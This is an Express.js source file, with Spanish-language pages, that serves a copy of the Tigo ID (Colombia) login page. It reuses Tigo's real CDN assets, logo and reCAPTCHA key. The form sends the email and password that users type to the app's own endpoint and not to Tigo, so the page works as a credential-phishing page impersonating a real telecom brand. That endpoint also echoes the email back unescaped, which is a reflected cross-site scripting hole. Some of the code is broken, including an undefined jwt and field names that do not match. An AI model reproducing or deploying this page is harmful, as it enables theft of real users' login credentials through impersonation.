const express = require('express');
const app = express();
require('dotenv').config();

const port = process.env.PORT || 8090;

app.use(express.urlencoded({extended:false}));
app.use(express.json());


app.get('/',(req,res) => {
    res.send('Hola Mundo');
});

app.get('/login',(req,res)=>{
    res.send(`<html>
                <head>
                    <title>Login</title>
                </head>
                <body>
                    <form method= "POST" action="/auth">
                        Nombre de usuario: <input type="text" id="name" name="name"><br><br>
                        Contraseña: <input type="password" id="password" name="password"><br><br>    
                        <input type="submit" value="Inicio de sección"/>
                    </form>
                </body>
            </html>`
    );
});

app.post('/welcome/user', function (req, res) {

    const {email,password} = req.body;
    const user = {email: email};
    const msg = 'Login please';
    /*
    res.json({
        email: user,
        solo : email
    });
    
    if(req.body.email){
        res.json({
            mensaje : msg,
            login: false,
            email: user
        });
    }
    */
    
    res.send(`<!DOCTYPE html>
        <html lang="es">
            <head>
                <meta charset="utf-8"/>
                <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
                <meta content="x-page-id" name="login_email_validate"/>
                <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
                <title>
        TigoID - Selfcare CO web convergente
                        login_email_validate
                </title>
                    <meta content="width=device-width, initial-scale=1" name="viewport">
        
            <!-- End -->
                <!-- Google reCaptcha v3 library -->
                <script src="https://www.google.com/recaptcha/api.js?render=6Ldz9-sZAAAAAPsWTJmLp3IfOPrs4pmU4SwacqGy"></script>
                <!-- End -->
        
                <link rel="icon" type="image/png" href="https://tigoid-cdn.tigocloud.net/v2/r05/page/skin/default/images/favicon.png">
                <link href="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/css/font-style.css?v=6" rel="stylesheet"/>
                <link href="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/css/materialize.min.css?ver=1" rel="stylesheet"/>
                <link href="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/css/materialize.ui.css" rel="stylesheet"/>
                <link href="https://tigoid-cdn.tigocloud.net/v2/r05/page/skin/default/css/main.css" rel="stylesheet"/>
        
                <!-- from below -->
                <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/jquery-3.5.1.min.js"></script>
                <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/jquery-migrate-3.3.2.min.js"></script>
                <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/materialize.min.js"></script>
                <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/mask/jquery.mask.min.js"></script>
                <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/materialize.fields.js"></script>
                <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/materialize.pages.js"></script>
                <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/main.js?v=1"></script>
                <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/navigation.js?v=1.0.1"></script>
                <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/client.min.js?v=1.0.1"></script>
                <!-- end from below -->
            <style type="text/css">
                .social-login {
                    width: 32px;
                    height: 32px;
                    padding: 4px;
                }
                .xs-margin {
                    margin-bottom: 5px !important;
                }
                .sm-margin {
                    margin-bottom: 20px;
                }
                .reset-pass {
                    font-size: 0.8em;
                    margin-left: 3em;
                }
                .login-button {
                    margin-bottom: 20px;
                }
            </style>
                <!--<style id="antiClickjack">body{display:none !important;}</style>-->
                <style> span.path1, span.path2 {float:left;} </style>
            </head>
            <body class="grey lighten-3">
        <nav class="main-navbar">
            <div class="nav-wrapper brand-blue">
                <div class="brand-logo">
                    <img src="https://tigoid-cdn.tigocloud.net/v2/r05/page/skin/default/images/logo.png?v=1" class="logo" alt="Tigo ID | Logo"/>
                </div>
                <ul class="left">
                    <a id="id_back_arrow" style="display: none;" href="javascript:history.back();">
                        <i class="material-icons light-blue-text">&#xE5C4;</i>
                    </a>
                </ul>
            </div>
        </nav>

        <h2> Bienvenido ${email}</h2>
        </body> `
        );
    
});


app.listen(port, () => {
    console.log("App is running on port " + port);
});


app.get('/logintigo',(req,res)=>{
    res.send(`
<!DOCTYPE html>
<html lang="es">
    <head>
        <meta charset="utf-8"/>
        <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
        <meta content="x-page-id" name="login_email_validate"/>
        <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
        <title>
TigoID - Selfcare CO web convergente
                login_email_validate
        </title>
            <meta content="width=device-width, initial-scale=1" name="viewport">

    <!-- End -->
        <!-- Google reCaptcha v3 library -->
        <script src="https://www.google.com/recaptcha/api.js?render=6Ldz9-sZAAAAAPsWTJmLp3IfOPrs4pmU4SwacqGy"></script>
        <!-- End -->

        <link rel="icon" type="image/png" href="https://tigoid-cdn.tigocloud.net/v2/r05/page/skin/default/images/favicon.png">
        <link href="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/css/font-style.css?v=6" rel="stylesheet"/>
        <link href="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/css/materialize.min.css?ver=1" rel="stylesheet"/>
        <link href="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/css/materialize.ui.css" rel="stylesheet"/>
        <link href="https://tigoid-cdn.tigocloud.net/v2/r05/page/skin/default/css/main.css" rel="stylesheet"/>

        <!-- from below -->
        <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/jquery-3.5.1.min.js"></script>
        <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/jquery-migrate-3.3.2.min.js"></script>
        <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/materialize.min.js"></script>
        <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/mask/jquery.mask.min.js"></script>
        <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/materialize.fields.js"></script>
        <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/materialize.pages.js"></script>
        <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/main.js?v=1"></script>
        <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/navigation.js?v=1.0.1"></script>
        <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/client.min.js?v=1.0.1"></script>
        <!-- end from below -->
    <style type="text/css">
        .social-login {
            width: 32px;
            height: 32px;
            padding: 4px;
        }
        .xs-margin {
            margin-bottom: 5px !important;
        }
        .sm-margin {
            margin-bottom: 20px;
        }
        .reset-pass {
            font-size: 0.8em;
            margin-left: 3em;
        }
        .login-button {
            margin-bottom: 20px;
        }
    </style>
        <!--<style id="antiClickjack">body{display:none !important;}</style>-->
        <style> span.path1, span.path2 {float:left;} </style>
    </head>

    <body class="grey lighten-3">
        <nav class="main-navbar">
            <div class="nav-wrapper brand-blue">
                <div class="brand-logo">
                    <img src="https://tigoid-cdn.tigocloud.net/v2/r05/page/skin/default/images/logo.png?v=1" class="logo" alt="Tigo ID | Logo"/>
                </div>
                <ul class="left">
                    <a id="id_back_arrow" style="display: none;" href="javascript:history.back();">
                        <i class="material-icons light-blue-text">&#xE5C4;</i>
                    </a>
                </ul>
            </div>
        </nav>


        <div class="progress">
            <div class="indeterminate"></div>
        </div>


    <div class="main card login_email_validate">
        <div class="card-content">
            <div class="header-wrapper">
                <h5 class="card-title center-align">Bienvenido(a) a Tigo!</h5>
            </div>
            <form class="emailForm" id="emailForm" method="POST" action="/welcome/user">
                <input type="hidden" id="providerId" name="provider" value=""/>
                <input type="hidden" id="deviceId" name="deviceId" value=""/>
                <div class="input-field verticalGroup">
                    <span class="icon-mail-indigo prefix">
                        <span class="path1"></span>
                        <span class="path2"></span>
                    </span>
                        <input type="text" id="idEmail" name="email" class="validate focusGroup-item" value="" required autocomplete="email" tabindex="1" autofocus/>
                    <label for="email" data-error="Invalid email address">Correo electrónico</label>
                    <div class="notfound hide">
                        <span class="notfound-text">
                            <small>No existe una cuenta asociada a este correo. Puedes
                                <a href="#" id="createNew">crear una cuenta</a>
                                usando este correo electrónico</small>
                        </span>
                    </div>
                </div>
                <div class="input-field verticalGroup sm-margin">
                    <span class="icon-password-indigo prefix">
                        <span class="path1"></span>
                        <span class="path2"></span>
                    </span>
                    <input type="password" id="password" name="pass" class="validate focusGroup-item xs-margin" value="" tabindex="1" required />
                    <span class="password-helper material-icons right light-blue-text">&#xE8F5;</span><br/>
                    <label for="password" data-error="Invalid password">Contraseña</label>
                    <div class="notfound hide">
                        <span class="notfound-text">
                            <small>No existe una cuenta asociada a este correo. Puedes
                                <a href="#" id="createNew">crear una cuenta</a>
                                usando este correo electrónico</small>
                        </span>
                    </div>
                    <a href="https://id.tigo.com:443/openid/password/reset/" class="light-blue-text focusGroup-item reset-pass" id="lnk-forgot-password" tabindex="3">¿Olvidaste tu contraseña?</a>
                </div>
                <div class="row login-button verticalGroup">
                    <div class="center-align clearfix">
                        <input type="hidden" id="csrf_token" name="csrf_token" value="86d3f93a-439a-427f-9937-e8c082ffa302"/>
                        <input type="hidden" id="g-recaptcha-response" name="g-recaptcha-response" value=""/>
                        <button class="btn waves-effect waves-light light-blue white-text focusGroup-item" type="submit" id="submitBtn" name="action" tabindex="2"  >Continuar</button>
                    </div>
                </div>
            </form>
            <div class="row verticalGroup">
                <div class="center-align">
                    <p>O acceder con:</p>
                    <div class="fb-login-button" data-max-rows="1" data-size="large" data-button-type="continue_with" data-show-faces="false" data-auto-logout-link="false" data-use-continue-as="false"></div>
                    <div id="SLFacebook" class="waves-effect btn light-blue darken-4 white-text text-darken-4 fb social-login focusGroup-item" tabindex="3">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" version="1">
                            <path fill="#FFFFFF" d="M32 30a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2h28a2 2 0 0 1 2 2v28z"/>
                            <path fill="#4267b2" d="M22 32V20h4l1-5h-5v-2c0-2 1.002-3 3-3h2V5h-4c-3.675 0-6 2.881-6 7v3h-4v5h4v12h5z"/>
                        </svg>
                    </div>
                    <div id="SLGoogle" class="waves-effect btn white grey-text text-darken-2 social-login focusGroup-item" tabindex="4">
                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 46 46">
                            <defs>
                                <path id="a" d="M44.5 20H24v8.5h11.8C34.7 33.9 30.1 37 24 37c-7.2 0-13-5.8-13-13s5.8-13 13-13c3.1 0 5.9 1.1 8.1 2.9l6.4-6.4C34.6 4.1 29.6 2 24 2 11.8 2 2 11.8 2 24s9.8 22 22 22c11 0 21-8 21-22 0-1.3-.2-2.7-.5-4z"/>
                            </defs>
                            <clipPath id="b"><use xlink:href="#a" overflow="visible"/></clipPath>
                            <path clip-path="url(#b)" fill="#FBBC05" d="M0 37V11l17 13z"/>
                            <path clip-path="url(#b)" fill="#EA4335" d="M0 11l17 13 7-6.1L48 14V0H0z"/>
                            <path clip-path="url(#b)" fill="#34A853" d="M0 37l30-23 7.9 1L48 0v48H0z"/>
                            <path clip-path="url(#b)" fill="#4285F4" d="M48 48L17 24l-4-3 35-10z"/>
                        </svg>
                    </div>
                </div>
            </div>
            <div class="row verticalGroup">
                <div class="center-align">
                    <p>Si no dispone de una cuenta pulse 
                        <a href="https://id.tigo.com/openid/login/signup_form" class="light-blue-text" id="lnk-create-account" tabindex="5">aquí</a>
                    </p>
                </div>
            </div>
        </div>
    </div>

        <script type="text/javascript">
            var client = new ClientJS(),
                fingerprint = client.getFingerprint();
            $(function () {
                App.pageId = "login_email_validate";
                App.init({});

                // specific for phone_add
                $('#id_country_button').on('click', function () {
                    $(this)
                        .siblings(".prefix")
                        .addClass("active");
                });
                // get icon from className
                function getIcon(classNames) {
                    var icon = "";
                    $.each(classNames, function (i, className) {
                        // class refered to icons
                        if (className.indexOf("icon") != -1) {
                            // index start in the "second" position of "-"
                            var startSub = className.indexOf("-", 5);
                            // extract based on index
                            icon = className.substr(0, startSub);
                        }
                    });
                    return icon;
                }
                if (App.pageId !== 'phone_smsotp') {
                    // ICON ACTIVATOR
                    var inputField = $('.input-field');
                    // detect click on input-field
                    inputField.on("click", function () {
                        var hisChildren = $(this).children('span.prefix');
                        // the child of inputField that has .active set the cyan icons
                        if (hisChildren.hasClass("active")) {
                            try {
                                var classNames = $(this)
                                    .children('span')
                                    .attr("class")
                                    .toString()
                                    .split(' ');
                                var icon = getIcon(classNames);
                                // toggle class
                                hisChildren.removeClass(icon + "-indigo");
                                hisChildren.addClass(icon + "-cyan");
                            } catch (e) {
                                console.log(e);
                            }
                        }
                    });
                    // detect focusout
                    inputField.on("focusout", function () {
                        try {
                            var hisChildren = $(this).children('span.prefix');
                            var classNames = $(this)
                                .children('span')
                                .attr("class")
                                .toString()
                                .split(' ');
                            var icon = getIcon(classNames);
                            // toggle class
                            if (icon.length > 0) {
                                hisChildren.removeClass(icon + "-cyan");
                                hisChildren.addClass(icon + "-indigo");
                            }
                        } catch (e) {
                            console.log(e);
                        }
                    });
                }

                showBackArrow();
            });

            function showBackArrow() {
                if (document.referrer != "") {
                    $('#id_back_arrow').show();
                }
            }

            $('#id_back_arrow').on('click', function () {
                if (document.referrer == "") {
                    window.close()
                } else {
                    history.back()
                }
            })
        </script>

            <script type="text/javascript">
                $("#hideMessage").on("click", function (e) {
                    $("#messages").hide();
                });
            </script>

    <script src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/validations.js"></script>
    <script type="text/javascript" src="https://tigoid-cdn.tigocloud.net/v2/r05/page/shared/js/socialize.js?ver=0"></script>
    
   
        <script>
            analytics.ready(function () {
                segmentInit();
                segmentTrack("Login Loaded", {"journey": "login"});
                
                
                $("#idEmail").on("click", function () {
                    segmentTrack("Login ID Edit Clicked", {"journey": "login"});
                });
                $("#lnk-forgot-password").on('click', function () {
                    segmentTrack("Password Forgot Clicked", {"journey": "user-profile"});
                });
                $("#lnk-create-account").on("click", function () {
                    segmentTrack("Registration Clicked", {"journey": "registration"});
                });
                $("#SLFacebook").on("click", function () {
                    segmentTrack("Login Method Selected", {
                        "journey": "login",
                        "authentication_type": "facebook"
                    });
                });
                $("#SLGoogle").on("click", function () {
                    segmentTrack("Login Method Selected", {
                        "journey": "login",
                        "authentication_type": "google"
                    });
                });
            });
        </script>
    </body>
</html>`
);
});

app.post('/auth',(req, res)=>{
    const {name,password} = req.body;
    //consultar de de base de datos y validar que existen 
    const user = {username: name};

    const accessToken = generateAccessToken(user);
    
    res.header('authorization', accessToken).json({
        message:'Usuario autenticado',
        token: accessToken,
        username : name
    });
});

function generateAccessToken(user){
    return jwt.sign(user, process.env.SECRET, {expiresIn:'12h'});
}